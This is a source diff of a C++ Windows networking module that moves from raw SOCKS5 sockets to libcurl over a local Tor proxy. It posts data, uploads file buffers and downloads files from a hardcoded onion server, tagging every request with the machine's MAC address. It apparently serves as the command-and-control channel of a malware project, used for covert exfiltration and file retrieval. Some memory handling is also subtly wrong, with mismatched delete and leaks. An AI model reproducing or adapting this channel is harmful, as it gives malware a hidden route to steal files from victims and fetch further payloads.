@@ -4,12 +4,51 @@
 #include "Util.h"
 #include "Tor.h"
 #include <IPHlpApi.h>
+#include <curl\curl.h>
+#include "External\http.h"
+
+static const char *post_url = "http://" V_NET_DOMAIN_ONION V_NET_BASE "p.php";
+
+struct http_response
+{
+	int code;
+	std::string body;
+};
+
+/* Some functions you have to supply tinyhttp to get it working */
+static void *response_realloc(void *opaque, void *ptr, int size)
+{
+	return realloc(ptr, size);
+}
+
+static void response_body(void *opaque, const char *data, int size)
+{
+	http_response *r = (http_response *)opaque;
+	r->body.insert(r->body.end(), data, data + size);
+}
+
+static void response_header(void *opaque, const char *ckey, int nkey, const char *cvalue, int nvalue)
+{
+}
+
+static void response_code(void *opaque, int code)
+{
+	http_response *r = (http_response *)opaque;
+	r->code = code;
+}
+
+static const http_funcs response_funcs = {
+	response_realloc,
+	response_body,
+	response_header,
+	response_code
+};
 
 Network network;
 
 Network::Network()
 {
-	WSAStartup(MAKEWORD(2, 0), &WSAData);
+	curl_global_init(CURL_GLOBAL_ALL);
 
 	/* Get MAC address */
 	IP_ADAPTER_INFO adapterInfo[16];
@@ -22,7 +61,6 @@ Network::Network()
 	}
 
 	/* Put MAC address into macAddrDataStr */
-	macAddrDataStr = "&mac=";
 	char buffer[16] = { 0 };
 	for(int i = 0; i < 6; i++) {
 		sprintf(buffer, "%02X", adapterInfo[0].Address[i]);
@@ -32,160 +70,221 @@ Network::Network()
 
 Network::~Network()
 {
-	WSACleanup();
+	curl_global_cleanup();
+}
+
+size_t CURLWriteToString(void *ptr, size_t size, size_t count, void *stream) {
+	size_t dataSize = size * count;
+	((std::string *)stream)->append((char *)ptr, 0, dataSize);
+	return dataSize;
+}
+
+struct CURLWriteDataMemoryStruct
+{
+	char *ptr;
+	size_t size;
+};
+
+size_t CURLWriteToBuffer(void *ptr, size_t size, size_t count, void *userp) {
+	size_t realsize = size * count;
+	CURLWriteDataMemoryStruct *ms = (CURLWriteDataMemoryStruct *)userp;
+
+	ms->ptr = (char *)realloc(ms->ptr, ms->size + realsize + 1);
+
+	memcpy(&(ms->ptr[ms->size]), ptr, realsize);
+	ms->size += realsize;
+	ms->ptr[ms->size] = 0;
+
+	return realsize;
+}
+
+bool InitCURLTorProxy(CURL *curl) {
+	CURLcode status;
+
+	status = curl_easy_setopt(curl, CURLOPT_PROXY, "127.0.0.1:9050");
+	if(status != CURLE_OK) {
+		VError(L"Couldn't init proxy");
+		return false;
+	}
+
+	status = curl_easy_setopt(curl, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5_HOSTNAME);
+	status = curl_easy_setopt(curl, CURLOPT_HEADER, 1);
+	status = curl_easy_setopt(curl, CURLOPT_HTTPPROXYTUNNEL, 1);
+
+	return true;
 }
 
 bool Network::Send(const char *req_method, const char *req_url, const char *req_type,
 					size_t req_num_parts, size_t *req_data_len, const char **req_data,
 					size_t *resp_len, char **resp_data)
 {
+    CURL *curl;
+	CURLcode status;
 
-	static const char* headers_proto =
-		"%s " V_NET_BASE "%s HTTP/1.1\r\n"
-		"Host: " V_NET_DOMAIN_ONION "\r\n"
-		"Content-Type: %s\r\n"
-		"Content-Length: %u\r\n\r\n";
+	http_response r;
+	r.code = 0;
 
-	size_t req_len = macAddrDataStr.size();
+	http_roundtripper rt;
+
+	std::string response;
+
+    /* Add MAC parameter to req_len */
+	std::string macAddrPost = "&mac=" + macAddrDataStr;
+	size_t req_len = macAddrPost.size();
+
 	for (size_t i = 0; i < req_num_parts; i++)
 		req_len += req_data_len[i];
 
-	char buf[1024];
-	sprintf_s(buf, headers_proto, req_method, req_url, req_type, req_len);
+	char *req_post_data = new char[req_len + 1];
 
-	SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
+	curl = curl_easy_init();
 
-	SOCKADDR_IN sin;
-	memset(&sin, 0, sizeof(sin));
-	sin.sin_family = AF_INET;
-	sin.sin_addr.s_addr = inet_addr("127.0.0.1");
-	sin.sin_port = htons(9050); // 9050 should be the port for tor
-
-	if (connect(sock, (struct sockaddr *) &sin, sizeof(sin)) < 0)
-	{
-		VError(L"connect() failed");
+	if(!InitCURLTorProxy(curl)) {
 		return false;
 	}
 
-	if(!SOCKS5Login(sock)) {
-		return false;
+	status = curl_easy_setopt(curl, CURLOPT_URL, post_url);
+    if(status != CURLE_OK) {
+        goto out_free_curl;
+    }
+
+	size_t s = 0;
+	for(size_t i = 0; i < req_num_parts; i++) {
+		memcpy(&req_post_data[s], req_data[i], req_data_len[i]);
+		s += req_data_len[i];
 	}
 
-	if(!SOCKS5Connect(sock, V_NET_DOMAIN_ONION, 80))
-		return 1;
-	
-	send(sock, buf, strlen(buf), 0);
+	memcpy(&req_post_data[s], macAddrPost.c_str(), macAddrPost.size());
+	s += macAddrPost.size();
+	req_post_data[s] = '\0'; /* \o/ */
 
-	for (size_t i = 0; i < req_num_parts; i++)
-		send(sock, req_data[i], req_data_len[i], 0);
+	status = curl_easy_setopt(curl, CURLOPT_POSTFIELDS, req_post_data);
+    if(status != CURLE_OK) {
+        goto out_free_curl;
+    }
 
-	send(sock, macAddrDataStr.c_str(), macAddrDataStr.size(), 0);
+	status = curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, CURLWriteToString);
+    if(status != CURLE_OK) {
+        goto out_free_curl;
+    }
 
-	size_t len_first = recv(sock, buf, sizeof(buf), 0);
-	if (len_first == 0 || len_first == SOCKET_ERROR)
-	{
-		VError(L"recv <= 0");
-		closesocket(sock);
-		return false;
-	}
+	status = curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
+    if(status != CURLE_OK) {
+        goto out_free_curl;
+    }
 
-	if (resp_len == nullptr || resp_data == nullptr)
-	{
-		closesocket(sock);
+	status = curl_easy_perform(curl);
+	if(status != CURLE_OK) {
+		VError(L"Failed to post");
+        goto out_free_curl;
+    }
+
+	delete req_post_data;
+	curl_easy_cleanup(curl);
+
+	if(response == "") {
 		return true;
 	}
 
-	static const char *header_clen_str = "Content-Length: ";
-	static const size_t header_clen_str_len = strlen(header_clen_str);
-	const char *clen_str = Util::memfind(buf, header_clen_str, len_first, header_clen_str_len);
-	if (!clen_str)
-	{
-		VError(L"Can't find Content-Length");
-		closesocket(sock);
-		return false;
-	}
-	clen_str += header_clen_str_len;
-
-	static const char* header_br = "\r\n\r\n";
-	static const size_t header_br_len = strlen(header_br);
-	const char *data_begin = Util::memfind(buf, header_br, len_first, header_br_len);
-	if (!data_begin)
-	{
-		VError(L"Can't find linebreaks before data");
-		closesocket(sock);
-		return false;
-	}
-	data_begin += header_br_len;
-
-	*resp_len = strtoul(clen_str, nullptr, 10);
-	if (*resp_len == ULONG_MAX)
-	{
-		VError(L"Can't parse Content-Length");
-		closesocket(sock);
-		return false;
-	}
-	
-	size_t len_header = data_begin - buf;
-	size_t len_data_first = len_first - len_header;
-	
-	*resp_data = (char*)malloc(*resp_len);
-	if (!*resp_data)
-	{
-		VError(L"malloc() failed");
-		closesocket(sock);
-		return false;
-	}
-	memcpy(*resp_data, data_begin, len_data_first);
-
-	if (len_first < *resp_len)
-	{
-		size_t read = len_data_first;
-		do
-		{
-			size_t ret = recv(sock, *resp_data + read, *resp_len - read, 0);
-			if (ret < 0)
-			{
-				VError(L"recv #2 <= 0");
-				closesocket(sock);
-				free(resp_data);
-				return false;
-			}
-			read += ret;
-		} while (read < *resp_len);
+	if(resp_len == nullptr || resp_data == nullptr) {
+		return true;
 	}
 
-	closesocket(sock);
+	http_init(&rt, response_funcs, &r);
+
+	int read = 0;
+	http_data(&rt, response.c_str(), response.size(), &read);
+
+	*resp_data = (char *)malloc(r.body.size());
+	memcpy(*resp_data, r.body.c_str(), r.body.size());
+	*resp_len = r.body.size();
+
 	return true;
+
+out_free_curl:
+    curl_easy_cleanup(curl);
+
+    delete req_post_data;
+    return false;
 }
 
 bool Network::SendFile(const char* req_url, size_t file_size, const char *file)
 {
-	static const char* req_disp =
-		"--gc0p4Jq0M2Yt08jU534c0p\r\n"
-		"Content-Disposition: form-data; name=\"s\"; filename=\"1\"\r\n"
-		"Content-Type: image/png\r\n\r\n";
-	static const size_t req_disp_len = strlen(req_disp);
+	CURL *curl;
+	CURLcode status;
+    bool ret = false;
 
-	static const char* req_dispend =
-		"\r\n--gc0p4Jq0M2Yt08jU534c0p--\r\n";
-	static const size_t req_dispend_len = strlen(req_dispend);
+	curl_httppost *formpost = NULL;
+	curl_httppost *lastptr = NULL;
+	curl_slist *headerlist = NULL;
+	std::string response;
 
-	size_t req_data_len[3] = {
-		req_disp_len,
-		file_size,
-		req_dispend_len
-	};
-	const char* req_data[3] = {
-		req_disp,
-		file,
-		req_dispend
-	};
+    curl = curl_easy_init();
+    if(!curl) {
+        goto out_free_curl;
+    }
 
-	return this->Send(
-		"POST", req_url, "multipart/form-data; boundary=gc0p4Jq0M2Yt08jU534c0p",
-		3, req_data_len, req_data,
-		nullptr, nullptr);
+	if(!InitCURLTorProxy(curl)) {
+		return false;
+	}
+
+	if(curl_formadd(	&formpost,
+                        &lastptr,
+                        CURLFORM_COPYNAME, "s",
+                        CURLFORM_BUFFER, "1",
+                        CURLFORM_BUFFERPTR, file,
+                        CURLFORM_BUFFERLENGTH, file_size,
+                        CURLFORM_END) != 0) {
+        goto out_free_curl;
+    }
+
+	if(curl_formadd(	&formpost,
+                        &lastptr,
+                        CURLFORM_COPYNAME, "mac",
+                        CURLFORM_COPYCONTENTS, macAddrDataStr.c_str(),
+                        CURLFORM_END) != 0) {
+        goto out_free_curl;
+    }
+
+	status = curl_easy_setopt(curl, CURLOPT_URL, post_url);
+    if(status != CURLE_OK) {
+        goto out_free_curl;
+    }
+
+	headerlist = curl_slist_append(headerlist, "Expect:");
+	status = curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headerlist);
+    if(status != CURLE_OK) {
+        goto out_free_curl;
+    }
+
+
+	status = curl_easy_setopt(curl, CURLOPT_HTTPPOST, formpost);
+    if(status != CURLE_OK) {
+        goto out_free_curl;
+    }
+
+
+    /* Do not need this? */
+
+	curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, CURLWriteToString);
+	curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
+
+	status = curl_easy_perform(curl);
+	if(status != CURLE_OK) {
+		VError(L"Failed curl post");
+	    goto out_free_curl;	
+	}
+
+    ret = true;
+
+out_free_curl:
+	curl_easy_cleanup(curl);
+	curl_formfree(formpost);
+	curl_slist_free_all(headerlist);
+
+	return ret;
 }
+
 bool Network::SendAndGetTextA(const char* req_url, const char *text, size_t *resp_len, char **resp_data)
 {
 	size_t req_data_len[1] = {
@@ -200,6 +299,7 @@ bool Network::SendAndGetTextA(const char* req_url, const char *text, size_t *res
 		1, req_data_len, req_data,
 		resp_len, resp_data);
 }
+
 bool Network::SendAndGetTextW(const char* req_url, const wchar_t *text, size_t *resp_len, wchar_t **resp_data)
 {
 	char *text_mb = Util::w2mb(text, wcslen(text));
@@ -230,10 +330,12 @@ bool Network::SendAndGetTextW(const char* req_url, const wchar_t *text, size_t *
 	}
 	return ret;
 }
+
 bool Network::SendTextA(const char* req_url, const char *text)
 {
 	return this->SendAndGetTextA(req_url, text, nullptr, nullptr);
 }
+
 bool Network::SendTextW(const char* req_url, const wchar_t *text)
 {
 	char *text_mb = Util::w2mb(text, wcslen(text));
@@ -241,10 +343,61 @@ bool Network::SendTextW(const char* req_url, const wchar_t *text)
 	free(text_mb);
 	return ret;
 }
+
 bool Network::GetFile(const char* req_url, size_t *resp_len, char **resp_data)
 {
-	return this->Send(
-		"GET", req_url, "application/x-www-form-urlencoded",
-		0, nullptr, nullptr,
-		resp_len, resp_data);
+	CURL *curl;
+	CURLcode status;
+	CURLWriteDataMemoryStruct response;
+	response.ptr = (char *)malloc(1);
+	response.size = 0;
+	std::string url;
+	url += "http://";
+	url += V_NET_DOMAIN_ONION;
+	url += "/";
+	url += req_url;
+	bool ret = false;
+
+	http_response r;
+	r.code = 0;
+
+	http_roundtripper rt;
+
+	curl = curl_easy_init();
+	if(!curl) {
+		goto out_free_curl;
+	}
+
+	if(!InitCURLTorProxy(curl)) {
+		goto out_free_curl;
+	}
+
+	curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
+
+	curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
+
+	curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, CURLWriteToBuffer);
+	curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
+
+	status = curl_easy_perform(curl);
+	if(status != CURLE_OK) {
+		goto out_free_curl;
+	}
+
+	http_init(&rt, response_funcs, &r);
+
+	int read = 0;
+	http_data(&rt, response.ptr, response.size, &read);
+
+	*resp_data = (char *)malloc(r.body.size());
+	memcpy(*resp_data, r.body.c_str(), r.body.size());
+	*resp_len = r.body.size();
+	
+	ret = true;
+
+	delete response.ptr;
+
+out_free_curl:
+	curl_easy_cleanup(curl);
+	return ret;
 }
